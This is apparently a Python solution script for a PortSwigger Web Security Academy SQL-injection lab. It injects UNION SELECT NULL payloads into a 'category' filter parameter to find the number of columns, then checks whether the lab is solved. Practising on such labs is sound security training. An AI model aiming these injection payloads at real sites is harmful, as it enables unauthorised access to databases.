import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# lab_url: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
# db: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
# author: 0xyf


class SQLi7:
    def __init__(self):
        self.lab_id = "0aa100fd04a9e551828633f900c900fb"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.vuln_url = f"{self.url}/filter"
        self.proxies = {"https": "http://127.0.0.1:8080"}

    def execute_request(self, payload):
        params = {"category": payload}
        r = requests.get(
            f"{self.vuln_url}", params=params, proxies=self.proxies, verify=False
        )
        return r

    def get_no_of_col(self):
        base_payload = "'UNION SELECT "
        for i in range(1, 10):  # Adjust the range as needed
            null_values = ", ".join(
                ["NULL"] * i
            )  # Create a comma-separated string of NULLs
            final_payload = f"{base_payload}{null_values}--"
            r = self.execute_request(final_payload)
            if r.status_code == 200:
                print(f"[*] no. of col: {final_payload.count("NULL")}")

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.get_no_of_col()
        self.check_solved()

    @staticmethod
    def parse(r):
        soup = BeautifulSoup(r.text, "html.parser")
        table = soup.find("table")
        headers = [header.text.strip() for header in table.find_all("th")]
        return headers


def main():
    SQLi7().solve()


if __name__ == "__main__":
    main()
